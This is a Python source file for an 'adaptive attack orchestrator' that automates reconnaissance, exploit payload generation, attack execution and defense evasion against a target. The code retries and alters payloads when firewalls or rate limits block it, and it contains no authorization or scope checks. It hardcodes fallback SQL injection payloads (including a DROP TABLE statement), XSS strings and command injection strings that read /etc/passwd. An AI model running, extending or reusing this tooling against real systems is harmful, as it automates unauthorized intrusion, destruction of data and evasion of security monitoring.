"""
Agent DS - Adaptive Attack Orchestrator
AI-driven attack sequencing and real-time adaptation
"""

import asyncio
import json
import logging
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
import numpy as np

from core.ai_learning.autonomous_engine import AutonomousLearningEngine
from core.attack_engine.executor import AttackEngine
from core.recon.scanner import ReconScanner
from core.vulnerability_intel.analyzer import VulnerabilityAnalyzer
from core.utils.logger import get_logger

logger = get_logger('adaptive_orchestrator')

@dataclass
class AttackPhase:
    """Represents a phase in the adaptive attack sequence"""
    phase_id: str
    phase_name: str
    attack_type: str
    target_context: Dict[str, Any]
    payloads: List[str]
    success_threshold: float
    max_attempts: int
    dependencies: List[str]
    evasion_techniques: List[str]

@dataclass
class AdaptationDecision:
    """AI decision for attack adaptation"""
    decision_id: str
    trigger_reason: str
    adaptation_type: str  # payload_modify, sequence_change, evasion_add
    new_payload: Optional[str]
    new_sequence: Optional[List[str]]
    confidence: float
    reasoning: str

class AdaptiveAttackOrchestrator:
    """AI orchestrator for adaptive attack execution"""
    
    def __init__(self):
        self.learning_engine = AutonomousLearningEngine()
        self.attack_engine = AttackEngine()
        self.recon_scanner = ReconScanner()
        self.vuln_analyzer = VulnerabilityAnalyzer()
        self.logger = get_logger('adaptive_attack')
        
        # Attack state
        self.current_mission = None
        self.attack_sequence = []
        self.adaptation_history = []
        self.real_time_metrics = {}
        
    async def execute_adaptive_mission(self, mission_config: Dict[str, Any]) -> Dict[str, Any]:
        """Execute complete adaptive attack mission"""
        mission_id = mission_config.get('mission_id')
        target = mission_config.get('target')
        
        mission_results = {
            'mission_id': mission_id,
            'target': target,
            'started_at': datetime.now().isoformat(),
            'phases_executed': [],
            'adaptations_made': [],
            'final_results': {},
            'learning_insights': {}
        }
        
        try:
            self.logger.info(f"Starting adaptive mission {mission_id} against {target}")
            
            # Phase 1: Enhanced Reconnaissance with AI Analysis
            recon_results = await self._execute_ai_reconnaissance(target)
            mission_results['phases_executed'].append({
                'phase': 'reconnaissance',
                'results': recon_results
            })
            
            # Phase 2: AI-Driven Vulnerability Analysis
            vuln_analysis = await self._execute_ai_vulnerability_analysis(recon_results)
            mission_results['phases_executed'].append({
                'phase': 'vulnerability_analysis',
                'results': vuln_analysis
            })
            
            # Phase 3: Generate Adaptive Attack Strategy
            attack_strategy = await self._generate_adaptive_strategy(vuln_analysis, target)
            mission_results['phases_executed'].append({
                'phase': 'strategy_generation',
                'results': attack_strategy
            })
            
            # Phase 4: Execute Adaptive Attack Sequence
            attack_results = await self._execute_adaptive_attack_sequence(attack_strategy)
            mission_results['phases_executed'].append({
                'phase': 'adaptive_attacks',
                'results': attack_results
            })
            
            # Phase 5: Real-time Learning and Optimization
            learning_results = await self.learning_engine.learn_from_mission(mission_id)
            mission_results['learning_insights'] = learning_results
            
            mission_results['completed_at'] = datetime.now().isoformat()
            mission_results['final_results'] = self._calculate_mission_success_metrics(mission_results)
            
            self.logger.info(f"Adaptive mission {mission_id} completed successfully")
            
        except Exception as e:
            mission_results['error'] = str(e)
            mission_results['failed_at'] = datetime.now().isoformat()
            self.logger.error(f"Adaptive mission {mission_id} failed: {str(e)}")
        
        return mission_results
    
    async def _execute_ai_reconnaissance(self, target: str) -> Dict[str, Any]:
        """Execute AI-enhanced reconnaissance"""
        recon_results = {
            'target': target,
            'scan_types': [],
            'discovered_services': [],
            'technology_stack': {},
            'ai_analysis': {},
            'attack_surface': {}
        }
        
        try:
            # Basic reconnaissance
            basic_recon = await self.recon_scanner.comprehensive_scan(target)
            recon_results.update(basic_recon)
            
            # AI analysis of reconnaissance results
            ai_analysis = await self._ai_analyze_recon_results(basic_recon)
            recon_results['ai_analysis'] = ai_analysis
            
            # Predict potential attack vectors
            attack_surface = await self._predict_attack_surface(basic_recon, ai_analysis)
            recon_results['attack_surface'] = attack_surface
            
        except Exception as e:
            recon_results['error'] = str(e)
            self.logger.error(f"AI reconnaissance failed: {str(e)}")
        
        return recon_results
    
    async def _ai_analyze_recon_results(self, recon_data: Dict) -> Dict[str, Any]:
        """AI analysis of reconnaissance results"""
        analysis = {
            'confidence_scores': {},
            'technology_fingerprints': {},
            'security_indicators': {},
            'potential_vulnerabilities': []
        }
        
        # Analyze discovered services
        services = recon_data.get('services', [])
        for service in services:
            service_name = service.get('service', '')
            version = service.get('version', '')
            
            # Confidence scoring based on service detection
            confidence = self._calculate_service_confidence(service)
            analysis['confidence_scores'][f"{service_name}:{version}"] = confidence
            
            # Technology fingerprinting
            tech_indicators = self._extract_technology_indicators(service)
            analysis['technology_fingerprints'].update(tech_indicators)
            
            # Security indicator analysis
            security_indicators = self._analyze_security_indicators(service)
            analysis['security_indicators'].update(security_indicators)
        
        # Predict vulnerabilities based on discovered technologies
        potential_vulns = await self._predict_vulnerabilities_from_tech_stack(
            analysis['technology_fingerprints']
        )
        analysis['potential_vulnerabilities'] = potential_vulns
        
        return analysis
    
    async def _generate_adaptive_strategy(self, vuln_analysis: Dict, target: str) -> Dict[str, Any]:
        """Generate AI-driven adaptive attack strategy"""
        strategy = {
            'target': target,
            'attack_phases': [],
            'success_predictions': {},
            'resource_requirements': {},
            'estimated_timeline': {}
        }
        
        try:
            # Get high-probability vulnerabilities
            vulnerabilities = vuln_analysis.get('results', {}).get('vulnerabilities', [])
            
            # Generate attack phases for each vulnerability
            for vuln in vulnerabilities:
                attack_phase = await self._create_attack_phase_for_vulnerability(vuln, target)
                if attack_phase:
                    strategy['attack_phases'].append(attack_phase)
            
            # Optimize attack sequence using AI
            optimized_sequence = await self._optimize_attack_sequence(strategy['attack_phases'])
            strategy['attack_phases'] = optimized_sequence
            
            # Predict success probabilities
            for phase in strategy['attack_phases']:
                success_prob = await self.learning_engine.predict_attack_success(
                    phase.attack_type, phase.payloads[0] if phase.payloads else '', 
                    phase.target_context
                )
                strategy['success_predictions'][phase.phase_id] = success_prob
            
        except Exception as e:
            strategy['error'] = str(e)
            self.logger.error(f"Strategy generation failed: {str(e)}")
        
        return strategy
    
    async def _create_attack_phase_for_vulnerability(self, vuln: Dict, target: str) -> Optional[AttackPhase]:
        """Create attack phase for specific vulnerability"""
        try:
            vuln_type = vuln.get('type', '')
            
            # Determine attack type based on vulnerability
            attack_type_mapping = {
                'sql_injection': 'sql_injection',
                'xss': 'xss',
                'rce': 'command_injection',
                'lfi': 'file_inclusion',
                'ssrf': 'ssrf'
            }
            
            attack_type = attack_type_mapping.get(vuln_type.lower(), 'generic')
            
            # Generate adaptive payloads for this vulnerability
            target_context = {
                'vulnerability': vuln,
                'target': target,
                'confidence': vuln.get('confidence', 0.5)
            }
            
            payloads = await self._generate_adaptive_payloads(attack_type, target_context)
            
            # Determine evasion techniques based on target characteristics
            evasion_techniques = await self._select_evasion_techniques(target_context)
            
            phase = AttackPhase(
                phase_id=f"phase_{vuln.get('id', 'unknown')}",
                phase_name=f"Exploit {vuln_type}",
                attack_type=attack_type,
                target_context=target_context,
                payloads=payloads,
                success_threshold=0.7,
                max_attempts=5,
                dependencies=[],
                evasion_techniques=evasion_techniques
            )
            
            return phase
            
        except Exception as e:
            self.logger.error(f"Failed to create attack phase: {str(e)}")
            return None
    
    async def _execute_adaptive_attack_sequence(self, attack_strategy: Dict) -> Dict[str, Any]:
        """Execute adaptive attack sequence with real-time adaptation"""
        sequence_results = {
            'total_phases': len(attack_strategy.get('attack_phases', [])),
            'phases_executed': [],
            'adaptations_made': [],
            'overall_success': False,
            'performance_metrics': {}
        }
        
        attack_phases = attack_strategy.get('attack_phases', [])
        
        for phase_data in attack_phases:
            try:
                # Convert dict to AttackPhase if needed
                if isinstance(phase_data, dict):
                    phase = AttackPhase(**phase_data)
                else:
                    phase = phase_data
                
                phase_results = await self._execute_adaptive_phase(phase)
                sequence_results['phases_executed'].append(phase_results)
                
                # Check if adaptation is needed
                if not phase_results.get('success', False):
                    adaptation = await self._make_adaptive_decision(phase, phase_results)
                    if adaptation:
                        sequence_results['adaptations_made'].append(adaptation)
                        
                        # Re-execute phase with adaptation
                        adapted_phase_results = await self._execute_adapted_phase(phase, adaptation)
                        sequence_results['phases_executed'].append(adapted_phase_results)
                
                # Update overall success
                if phase_results.get('success', False):
                    sequence_results['overall_success'] = True
                    break  # Stop on first successful exploitation
                
            except Exception as e:
                phase_error = {
                    'phase_id': getattr(phase, 'phase_id', 'unknown'),
                    'error': str(e)
                }
                sequence_results['phases_executed'].append(phase_error)
                self.logger.error(f"Phase execution failed: {str(e)}")
        
        return sequence_results
    
    async def _execute_adaptive_phase(self, phase: AttackPhase) -> Dict[str, Any]:
        """Execute single attack phase with monitoring"""
        phase_results = {
            'phase_id': phase.phase_id,
            'phase_name': phase.phase_name,
            'attack_type': phase.attack_type,
            'attempts': [],
            'success': False,
            'best_result': None,
            'adaptation_triggers': []
        }
        
        for attempt_num in range(phase.max_attempts):
            try:
                # Select best payload for this attempt
                payload = await self._select_optimal_payload(phase, attempt_num)
                
                # Execute attack with real-time monitoring
                attack_result = await self._execute_monitored_attack(
                    phase.attack_type, payload, phase.target_context, phase.evasion_techniques
                )
                
                phase_results['attempts'].append({
                    'attempt': attempt_num + 1,
                    'payload': payload,
                    'result': attack_result
                })
                
                # Check for success
                if attack_result.get('success', False):
                    phase_results['success'] = True
                    phase_results['best_result'] = attack_result
                    break
                
                # Check for adaptation triggers
                triggers = await self._check_adaptation_triggers(attack_result, phase)
                if triggers:
                    phase_results['adaptation_triggers'].extend(triggers)
                
            except Exception as e:
                phase_results['attempts'].append({
                    'attempt': attempt_num + 1,
                    'error': str(e)
                })
                self.logger.error(f"Attack attempt failed: {str(e)}")
        
        return phase_results
    
    async def _make_adaptive_decision(self, phase: AttackPhase, 
                                    phase_results: Dict) -> Optional[AdaptationDecision]:
        """Make AI-driven adaptation decision based on phase results"""
        try:
            # Analyze failure patterns
            attempts = phase_results.get('attempts', [])
            failure_patterns = []
            
            for attempt in attempts:
                result = attempt.get('result', {})
                if not result.get('success', False):
                    failure_patterns.append({
                        'response_code': result.get('response_code'),
                        'error_type': result.get('error_message', ''),
                        'response_content': result.get('response_content', '')[:100]
                    })
            
            # Determine adaptation type based on failure patterns
            adaptation_type = await self._determine_adaptation_type(failure_patterns)
            
            if adaptation_type == 'payload_modify':
                # Generate new payload based on failure analysis
                failed_payloads = [attempt.get('payload') for attempt in attempts]
                new_payload = await self.learning_engine.generate_adaptive_payload(
                    phase.attack_type, phase.target_context, failed_payloads
                )
                
                decision = AdaptationDecision(
                    decision_id=f"adapt_{phase.phase_id}_{datetime.now().timestamp()}",
                    trigger_reason="payload_ineffective",
                    adaptation_type="payload_modify",
                    new_payload=new_payload,
                    new_sequence=None,
                    confidence=0.8,
                    reasoning="Generated new payload based on failure pattern analysis"
                )
                
                return decision
            
            elif adaptation_type == 'evasion_add':
                # Add new evasion techniques
                decision = AdaptationDecision(
                    decision_id=f"adapt_{phase.phase_id}_{datetime.now().timestamp()}",
                    trigger_reason="detection_suspected",
                    adaptation_type="evasion_add",
                    new_payload=None,
                    new_sequence=None,
                    confidence=0.7,
                    reasoning="Adding evasion techniques due to detection indicators"
                )
                
                return decision
            
        except Exception as e:
            self.logger.error(f"Failed to make adaptation decision: {str(e)}")
        
        return None
    
    async def _execute_monitored_attack(self, attack_type: str, payload: str, 
                                      target_context: Dict, evasion_techniques: List[str]) -> Dict:
        """Execute attack with real-time monitoring and response analysis"""
        try:
            # Prepare attack parameters
            attack_params = {
                'attack_type': attack_type,
                'payload': payload,
                'target': target_context.get('target'),
                'evasion_techniques': evasion_techniques
            }
            
            # Execute attack using existing attack engine
            result = await self.attack_engine.execute_attack(attack_params)
            
            # Enhanced monitoring and analysis
            enhanced_result = await self._enhance_attack_result(result, target_context)
            
            return enhanced_result
            
        except Exception as e:
            return {
                'success': False,
                'error_message': str(e),
                'timestamp': datetime.now().isoformat()
            }
    
    async def _enhance_attack_result(self, basic_result: Dict, target_context: Dict) -> Dict:
        """Enhance attack result with AI analysis"""
        enhanced = basic_result.copy()
        
        # Add AI analysis
        enhanced['ai_analysis'] = {
            'detection_probability': await self._estimate_detection_probability(basic_result),
            'evasion_effectiveness': await self._analyze_evasion_effectiveness(basic_result),
            'payload_innovation_score': await self._score_payload_innovation(basic_result),
            'target_response_patterns': await self._analyze_target_response_patterns(basic_result)
        }
        
        # Add learning recommendations
        enhanced['learning_recommendations'] = await self._generate_learning_recommendations(
            basic_result, target_context
        )
        
        return enhanced
    
    async def _estimate_detection_probability(self, attack_result: Dict) -> float:
        """Estimate probability that attack was detected"""
        detection_indicators = 0
        total_indicators = 5
        
        # Check response time (unusually slow might indicate processing)
        if attack_result.get('response_time', 0) > 10.0:
            detection_indicators += 1
        
        # Check response codes
        response_code = attack_result.get('response_code', 200)
        if response_code in [403, 429, 503]:  # Blocked/rate limited
            detection_indicators += 1
        
        # Check response content for security messages
        content = attack_result.get('response_content', '').lower()
        if any(keyword in content for keyword in ['blocked', 'security', 'violation', 'firewall']):
            detection_indicators += 1
        
        # Check for consistent error patterns
        if 'error_message' in attack_result:
            detection_indicators += 1
        
        # Check for suspicious redirects
        if response_code in [301, 302] and 'security' in attack_result.get('headers', {}).get('location', ''):
            detection_indicators += 1
        
        return detection_indicators / total_indicators
    
    async def _generate_adaptive_payloads(self, attack_type: str, target_context: Dict) -> List[str]:
        """Generate multiple adaptive payloads for attack type"""
        payloads = []
        
        try:
            # Generate primary payload using AI learning
            primary_payload = await self.learning_engine.generate_adaptive_payload(
                attack_type, target_context
            )
            payloads.append(primary_payload)
            
            # Generate variants with different evasion techniques
            for i in range(3):  # Generate 3 additional variants
                variant_payload = await self._generate_payload_variant(
                    primary_payload, attack_type, i
                )
                payloads.append(variant_payload)
            
        except Exception as e:
            self.logger.error(f"Failed to generate adaptive payloads: {str(e)}")
            # Fallback to basic payloads
            payloads = self._get_basic_payloads(attack_type)
        
        return payloads
    
    def _get_basic_payloads(self, attack_type: str) -> List[str]:
        """Get basic payloads as fallback"""
        basic_payloads = {
            'sql_injection': [
                "' UNION SELECT 1,2,3--",
                "' OR '1'='1'--",
                "'; DROP TABLE users;--"
            ],
            'xss': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                'javascript:alert("XSS")'
            ],
            'command_injection': [
                '; cat /etc/passwd',
                '| whoami',
                '`id`'
            ]
        }
        
        return basic_payloads.get(attack_type, ["test_payload"])
    
    async def _generate_learning_recommendations(self, attack_result: Dict, 
                                               target_context: Dict) -> List[str]:
        """Generate recommendations for future learning"""
        recommendations = []
        
        if attack_result.get('success'):
            recommendations.append("Store successful payload pattern for future use")
            recommendations.append("Analyze target response for common success indicators")
        else:
            recommendations.append("Analyze failure pattern for defensive measure identification")
            recommendations.append("Consider alternative attack vectors for this target type")
        
        if attack_result.get('response_time', 0) > 5.0:
            recommendations.append("Investigate slow response times for potential vulnerabilities")
        
        return recommendations